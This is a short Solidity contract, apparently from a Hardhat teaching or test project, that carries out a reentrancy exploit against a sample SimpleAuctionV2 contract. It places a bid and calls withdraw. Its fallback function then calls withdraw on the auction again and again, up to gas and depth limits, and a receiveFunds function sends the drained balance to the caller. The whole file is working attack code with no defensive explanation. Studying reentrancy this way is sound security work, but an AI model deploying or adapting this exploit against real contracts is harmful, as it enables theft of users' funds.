// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./SimpleAuctionV2.sol";
import "hardhat/console.sol";
contract HackV2 {
    uint stack = 0;

    function hack_bid(address addr) public payable {
        SimpleAuctionV2 sa = SimpleAuctionV2(addr);
        // console.log(">>> run in hack_bid msg.value ->", msg.value);
        sa.bid{value: msg.value}();
    }

    function hack_withdraw(address addr) public payable {
        SimpleAuctionV2(addr).withdraw();
    }

    fallback() external payable {
        stack += 2;
        if (
            msg.sender.balance >= msg.value && gasleft() > 6000 && stack < 500
        ) {
            SimpleAuctionV2(msg.sender).withdraw();
        }
    }

    function receiveFunds() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}
